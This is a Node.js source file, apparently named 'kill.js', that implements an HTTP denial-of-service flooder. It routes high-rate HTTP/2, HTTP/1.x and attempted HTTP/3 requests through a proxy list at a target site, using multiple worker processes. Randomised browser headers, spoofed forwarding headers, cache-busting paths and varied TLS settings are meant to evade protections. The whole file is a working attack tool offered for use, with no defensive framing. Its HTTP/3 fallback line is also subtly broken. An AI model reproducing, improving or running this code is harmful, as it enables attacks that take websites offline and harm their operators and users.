const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const https = require("https");
const http = require("http");

// Placeholder for HTTP/3 (requires external library like quic-http3)
const http3 = require("quic-http3") || { connect: () => console.log("HTTP/3 not supported") };

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node kill.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit(1);
}

const headers = {};

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`File ${filePath} not found`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
    if (lines.length === 0) {
        console.error(`Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error("Invalid target URL");
    process.exit(1);
}

// Enhanced header lists for better bypass
const sig = [
    "ecdsa_secp256r1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "rsa_pkcs1_sha384",
    "rsa_pkcs1_sha512"
];
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html, */*; q=0.01"
];
const lang_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.8",
    "zh-CN,zh;q=0.9",
    "fr-FR,fr;q=0.8",
    "de-DE,de;q=0.7"
];
const encoding_header = [
    "gzip, deflate, br",
    "gzip, deflate",
    "br",
    "identity"
];
const version = [
    '"Google Chrome";v="125"',
    '"Microsoft Edge";v="125"',
    '"Firefox";v="115"',
    '"Safari";v="17"'
];
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
];
const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "via": randstr(12) },
    { "x-forwarded-for": randstr(12) },
    { "client-ip": randstr(12) },
    { "referer": `https://${parsedTarget.host}/${randstr(8)}` }
];

// TLS cipher suites for better compatibility and bypass
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

// Request distribution based on provided ratios
const requestRatios = {
    http2: 68.1e6 / (68.1e6 + 267.66e3 + 6.22e3 + 5), // HTTP/2
    http1_1: 267.66e3 / (68.1e6 + 267.66e3 + 6.22e3 + 5), // HTTP/1.1
    http3: 6.22e3 / (68.1e6 + 267.66e3 + 6.22e3 + 5), // HTTP/3
    http1_0: 5 / (68.1e6 + 267.66e3 + 6.22e3 + 5) // HTTP/1.0
};

const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${parsedTarget.host}`);
    console.log(`Duration: ${args.time} seconds`);
    console.log(`Threads: ${args.threads}`);
    console.log(`RPS: ${args.Rate}`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 50); // Reduced interval for faster cycling
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, `error: invalid response from proxy ${options.host}:${options.port}`);
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, `error: timeout exceeded for ${options.host}:${options.port}`);
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: ${error.message} for ${options.host}:${options.port}`);
        });
    }
}

const Socker = new NetSocket();

function getDynamicHeaders() {
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
        ":scheme": "https",
        "sec-ch-ua": randomElement(version),
        "sec-ch-ua-platform": randomElement(["Windows", "macOS", "Linux"]),
        "accept-encoding": randomElement(encoding_header),
        "accept-language": randomElement(lang_header),
        "accept": randomElement(accept_header),
        "user-agent": randomElement(userAgents),
        ...randomElement(rateHeaders)
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) {
        console.error(`Invalid proxy format: ${proxyAddr}`);
        return setTimeout(runFlooder, 1000);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 5
    };

    let retryCount = 0;
    const maxRetries = 5;

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            if (retryCount < maxRetries) {
                retryCount++;
                console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
                setTimeout(runFlooder, 1000);
            } else {
                console.error(`Max retries reached for ${proxyAddr}`);
            }
            return;
        }

        // Determine protocol based on ratios
        const rand = Math.random();
        let protocol = "http2";
        if (rand < requestRatios.http3) protocol = "http3";
        else if (rand < requestRatios.http3 + requestRatios.http1_1) protocol = "http1_1";
        else if (rand < requestRatios.http3 + requestRatios.http1_1 + requestRatios.http1_0) protocol = "http1_0";

        const tlsOptions = {
            secure: true,
            ALPNProtocols: protocol === "http3" ? ["h3"] : ["h2", "http/1.1"],
            ciphers: randomElement(ciphers),
            sigalgs: randomElement(sig),
            ecdhCurve: "auto",
            minVersion: Math.random() < 0.7 ? "TLSv1.3" : "TLSv1.2", // Bias towards TLSv1.3
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        if (protocol === "http2") {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 65536,
                    enablePush: false
                },
                createConnection: () => tlsConn
            });

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    const dynHeaders = getDynamicHeaders();
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(dynHeaders);
                        request.on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        request.on("error", () => {
                            request.close();
                            request.destroy();
                        });
                        request.end();
                    }
                }, 50);
                setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
            });

            client.on("error", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                setTimeout(runFlooder, 1000);
            });

            client.on("close", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                setTimeout(runFlooder, 1000);
            });
        } else if (protocol === "http3") {
            // HTTP/3 (QUIC) handling
            const client = http3.connect(parsedTarget.href, {
                protocol: "https:",
                createConnection: () => tlsConn
            });

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    const dynHeaders = getDynamicHeaders();
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(dynHeaders);
                        request.on("response", () => request.destroy());
                        request.on("error", () => request.destroy());
                        request.end();
                    }
                }, 50);
                setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
            });

            client.on("error", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                setTimeout(runFlooder, 1000);
            });
        } else if (protocol === "http1_1") {
            const agent = new https.Agent({ createConnection: () => tlsConn });
            const IntervalAttack = setInterval(() => {
                const dynHeaders = getDynamicHeaders();
                for (let i = 0; i < args.Rate; i++) {
                    const req = https.request({
                        host: parsedTarget.host,
                        port: 443,
                        path: parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
                        method: "GET",
                        headers: dynHeaders,
                        agent
                    });
                    req.on("response", () => req.destroy());
                    req.on("error", () => req.destroy());
                    req.end();
                }
            }, 50);
            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
        } else if (protocol === "http1_0") {
            const agent = new http.Agent({ createConnection: () => tlsConn });
            const IntervalAttack = setInterval(() => {
                const dynHeaders = getDynamicHeaders();
                for (let i = 0; i < args.Rate; i++) {
                    const req = http.request({
                        host: parsedTarget.host,
                        port: 443,
                        path: parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
                        method: "GET",
                        headers: { ...dynHeaders, Connection: "close" },
                        agent
                    });
                    req.on("response", () => req.destroy());
                    req.on("error", () => req.destroy());
                    req.end();
                }
            }, 50);
            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
        }
    });
}
